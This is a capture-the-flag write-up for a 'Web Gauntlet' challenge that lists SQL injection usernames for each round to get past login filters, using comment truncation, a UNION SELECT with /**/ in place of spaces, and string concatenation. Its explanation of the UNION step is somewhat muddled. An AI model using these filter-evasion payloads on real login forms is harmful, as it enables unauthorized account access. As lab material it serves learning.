
# Web Gauntlet

SQL injections and variants.


# Problem

The challenge is to bypass the filters in order to get a successful login via the SQL queries.
Each time you're successful, the SQL query is printed out.

The password for each round doesn't matter, you can always enter `whatever`.

# Solution

## Round 1:

Username: `admin' /*` or `admin; --`

## Round 2:

Username: `admin' /*`

## Round 3:

Username: `admin';`

## Round 4 (alternative)

I think the challenge was designed so that it should use a `UNION` statement, and refers to the
fact that the username `admin` might be the first user in the table `users`.

Username: `whatever'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;`

This will execute actually two different SQL queries, where all occurances of `/**/` will be converted
to a space character.

- First query is `SELECT * FROM users WHERE username='whatever'`
- Second query is `SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;`

## Round 4 and 5:

This one is much tougher and took me a while. Behind the scenes, `admin` as a username isn't allowed
so the resulting SQL query should concat the values together. You can probably also use `a'||'dmin'`
or similar variants alternatively.

Username: `ad'||'min';`

